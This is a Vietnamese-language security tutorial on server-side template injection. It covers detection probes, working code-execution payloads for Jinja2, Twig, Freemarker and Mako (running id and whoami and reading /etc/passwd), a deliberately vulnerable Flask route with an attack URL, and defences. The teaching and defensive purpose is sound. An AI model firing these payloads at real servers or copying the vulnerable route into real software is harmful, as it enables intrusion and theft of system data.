# Server-Side Template Injection (SSTI)

> **OWASP Top 10:2025**: A05 – Injection | **CWE**: CWE-1336 | **Nguồn**: PortSwigger, HackTricks

## 🧱 Kiến thức Nền tảng

Template engine là thành phần phổ biến trong web development, cho phép tách biệt logic xử lý và giao diện hiển thị. Các template engine phổ biến bao gồm: **Jinja2** (Python/Flask), **Twig** (PHP/Symfony), **Freemarker** (Java/Spring), **Mako** (Python), **Pebble** (Java), **Handlebars** (Node.js).

Template engine hoạt động bằng cách nhận một template string chứa các placeholder, sau đó **render** bằng cách thay thế placeholder bằng dữ liệu thực tế. Quá trình render này chạy trên **server-side**, nghĩa là template engine có quyền truy cập vào môi trường server.

```python
# Normal Jinja2 template rendering in Flask
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/hello/<name>')
def hello(name):
    # Safe: user input is passed as DATA to the template
    template = "Hello, {{ username }}! Welcome to our site."
    return render_template_string(template, username=name)
    # Template engine escapes the value and renders it safely
```

Điểm quan trọng: khi user input được truyền dưới dạng **data** vào template, nó an toàn. Vấn đề phát sinh khi user input được **nhúng trực tiếp vào template string** trước khi render — lúc này input trở thành một phần của template code và được engine thực thi.

## 🔍 Mô tả lỗ hổng

Server-Side Template Injection (SSTI) xảy ra khi ứng dụng nhúng user input trực tiếp vào template string, cho phép attacker chèn các template directives. Vì template engine thường có khả năng truy cập object model của ngôn ngữ lập trình bên dưới, SSTI có thể leo thang thành **Remote Code Execution (RCE)**.

Mức độ nghiêm trọng rất cao vì:
- Template engine chạy với **quyền của web server**
- Có thể đọc file hệ thống, biến môi trường, thực thi command
- Nhiều engine cho phép truy cập trực tiếp vào runtime classes

## ⚔️ Cơ chế tấn công

### Bước 1: Phát hiện SSTI

```
# Polyglot detection payload - test across multiple engines
${{<%[%'"}}%\.

# Engine-specific probes
{{7*7}}         → 49   (Jinja2, Twig)
${7*7}          → 49   (Freemarker, Mako, EL)
#{7*7}          → 49   (Pebble, Thymeleaf)
<%= 7*7 %>      → 49   (ERB - Ruby)
{{7*'7'}}       → 7777777  (Jinja2 specifically, string repeat)
{{7*'7'}}       → 49       (Twig, does multiplication)
```

### Bước 2: RCE Payloads theo Engine

```python
# Jinja2 (Python) - Class traversal to reach os.popen()
# Step 1: Access the Method Resolution Order (MRO)
{{''.__class__.__mro__[1].__subclasses__()}}

# Step 2: Find subprocess.Popen (usually index ~400+)
{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}

# Shorter Jinja2 RCE payload
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Using request object in Flask
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

```php
// Twig (PHP) - Using filter function
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

// Twig 3.x payload
{{['id']|map('system')}}
```

```java
// Freemarker (Java) - Built-in Execute
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// Using ObjectConstructor
${"freemarker.template.utility.Execute"?new()("whoami")}
```

```python
# Mako (Python) - Direct Python code execution
<%import os%>${os.popen("id").read()}

# Alternative Mako payload
${__import__('os').popen('cat /etc/passwd').read()}
```

### Bước 3: Khai thác thực tế

```python
# Vulnerable Flask application
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/profile')
def profile():
    name = request.args.get('name', 'Guest')
    # VULNERABLE: User input concatenated into template string
    template = f"<h1>Welcome, {name}!</h1>"
    return render_template_string(template)

# Attack URL:
# /profile?name={{config.__class__.__init__.__globals__['os'].popen('cat+/etc/passwd').read()}}
```

## 🛡️ Biện pháp phòng thủ

1. **Không bao giờ nhúng user input vào template string**: Truyền dữ liệu qua context variables.
2. **Sandbox environment**: Sử dụng Jinja2 `SandboxedEnvironment` để giới hạn class/method access.
3. **Logic-less templates**: Chọn template engine không cho phép thực thi code (Mustache, Handlebars).
4. **WAF rules**: Chặn các pattern như `{{`, `${`, `<%`, `__class__`, `__mro__`.
5. **Tách biệt template từ user content**: Nếu cần template tùy chỉnh, chạy trong container isolated.

## 💻 Code Example

```python
# ❌ VULNERABLE: User input embedded in template string
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    name = request.args.get('name')
    # User input becomes part of the template CODE
    template = f"Hello {name}, welcome back!"
    return render_template_string(template)  # SSTI possible!
```

```python
# ✅ SECURE: User input passed as template data
from flask import Flask, request, render_template_string
from jinja2.sandbox import SandboxedEnvironment

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    name = request.args.get('name')
    # User input is DATA, not part of the template code
    template = "Hello {{ name }}, welcome back!"
    return render_template_string(template, name=name)  # Safe rendering

@app.route('/custom-template')
def custom_template():
    user_template = request.args.get('tpl')
    # If user-provided templates are required, use sandboxed environment
    env = SandboxedEnvironment()
    try:
        tpl = env.from_string(user_template)
        return tpl.render(allowed_var="safe_value")
    except Exception:
        return "Invalid template", 400
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/server-side-template-injection
- HackTricks – SSTI: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
- CWE-1336: https://cwe.mitre.org/data/definitions/1336.html
- PayloadsAllTheThings – SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
